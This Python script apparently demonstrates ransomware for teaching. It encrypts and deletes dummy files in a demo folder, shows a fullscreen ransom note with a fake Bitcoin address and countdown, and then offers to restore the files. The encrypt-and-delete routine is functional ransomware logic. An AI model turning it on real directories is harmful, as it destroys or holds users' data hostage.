import os
import time
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import threading

# IMPORTANT: This is an EDUCATIONAL DEMONSTRATION ONLY
# Real ransomware is illegal and unethical to deploy

class RansomwareDemo:
    def __init__(self, target_dir="demo_files"):
        # Create a directory with sample files for the demo
        self.target_dir = target_dir
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []
        
    def setup_demo_environment(self):
        """Create sample files for demonstration purposes"""
        # Create target directory if it doesn't exist
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
            
        # Create sample files with dummy content
        sample_files = [
            "important_document.txt", 
            "financial_records.csv",
            "family_photo.jpg",
            "work_presentation.pptx",
            "personal_notes.pdf"
        ]
        
        for filename in sample_files:
            filepath = os.path.join(self.target_dir, filename)
            with open(filepath, 'w') as f:
                f.write(f"This is sample content for {filename}. In a real scenario, this would be your actual file content.")
        
        print(f"Created sample files in {self.target_dir} directory")
    
    def encrypt_files(self):
        """Encrypt all files in the target directory"""
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Read the file content
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    # Encrypt the data
                    encrypted_data = self.cipher.encrypt(data)
                    
                    # Write the encrypted data back
                    with open(file_path + '.encrypted', 'wb') as f:
                        f.write(encrypted_data)
                    
                    # Remove the original file
                    os.remove(file_path)
                    
                    # Add to list of encrypted files
                    self.encrypted_files.append(file_path)
                    print(f"Encrypted: {file_path}")
                    
                except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")
        
        return len(self.encrypted_files)
    
    def show_ransom_note(self, encrypted_count):
        """Display a simulated ransom note using tkinter"""
        # Create the main window
        root = tk.Tk()
        root.title("!!! RANSOMWARE DEMONSTRATION !!!")
        root.configure(bg='black')
        root.attributes('-fullscreen', True)
        
        # Add a skull emoji or symbol
        skull = tk.Label(root, text="💀", font=("Arial", 72), fg="red", bg="black")
        skull.pack(pady=20)
        
        # Add ransom message
        message = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED!", 
                          font=("Arial", 36, "bold"), fg="red", bg="black")
        message.pack(pady=10)
        
        details = tk.Label(root, text=f"{encrypted_count} files are now locked with military-grade encryption.", 
                          font=("Arial", 18), fg="white", bg="black")
        details.pack(pady=5)
        
        payment = tk.Label(root, text="To recover your files, send 0.5 Bitcoin to the following address:", 
                          font=("Arial", 16), fg="white", bg="black")
        payment.pack(pady=10)
        
        btc_address = tk.Label(root, text="1A2B3C4D5E6F7G8H9I0J...", 
                              font=("Courier", 14), fg="yellow", bg="black")
        btc_address.pack(pady=5)
        
        timer_label = tk.Label(root, text="Time remaining before files are permanently deleted:", 
                              font=("Arial", 16), fg="white", bg="black")
        timer_label.pack(pady=10)
        
        countdown = tk.Label(root, text="24:00:00", font=("Arial", 24, "bold"), fg="red", bg="black")
        countdown.pack(pady=5)
        
        # For demonstration purposes, add a button to close the ransom note
        # and restore files (this would not exist in real ransomware)
        def close_and_decrypt():
            if messagebox.askyesno("Educational Demo", "This is only a demonstration.\nWould you like to decrypt the files now?"):
                root.destroy()
                self.decrypt_files()
        
        restore_btn = tk.Button(root, text="END DEMONSTRATION & RESTORE FILES", 
                               font=("Arial", 14), bg="green", fg="white",
                               command=close_and_decrypt)
        restore_btn.pack(pady=30)
        
        # Simulate countdown
        def update_timer():
            time_left = 24*60*60  # 24 hours in seconds
            while time_left > 0 and root.winfo_exists():
                hours = time_left // 3600
                minutes = (time_left % 3600) // 60
                seconds = time_left % 60
                countdown.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
                time_left -= 1
                time.sleep(0.01)  # Speed up for demo purposes (real time would be 1 second)
                root.update()
        
        # Start countdown in a separate thread
        timer_thread = threading.Thread(target=update_timer)
        timer_thread.daemon = True
        timer_thread.start()
        
        root.mainloop()
    
    def decrypt_files(self):
        """Decrypt all the previously encrypted files"""
        for file_path in self.encrypted_files:
            encrypted_path = file_path + '.encrypted'
            if os.path.exists(encrypted_path):
                try:
                    # Read the encrypted data
                    with open(encrypted_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    # Decrypt the data
                    decrypted_data = self.cipher.decrypt(encrypted_data)
                    
                    # Write the decrypted data back to the original file
                    with open(file_path, 'wb') as f:
                        f.write(decrypted_data)
                    
                    # Remove the encrypted file
                    os.remove(encrypted_path)
                    print(f"Decrypted: {file_path}")
                    
                except Exception as e:
                    print(f"Error decrypting {file_path}: {e}")
        
        messagebox.showinfo("Demo Complete", 
                          f"Demonstration completed.\nAll {len(self.encrypted_files)} files have been restored.")

def run_demo():
    # Display warning first
    if messagebox.askokcancel("Security Warning", 
                            "This is an EDUCATIONAL DEMONSTRATION of how ransomware works.\n" + 
                            "No actual harm will be done to your system.\n" + 
                            "Sample files will be created and then 'encrypted' for demonstration only.\n\n" + 
                            "Do you want to proceed with this demonstration?"):
        
        demo = RansomwareDemo()
        demo.setup_demo_environment()
        print("Starting encryption process...")
        encrypted_count = demo.encrypt_files()
        demo.show_ransom_note(encrypted_count)

if __name__ == "__main__":
    run_demo()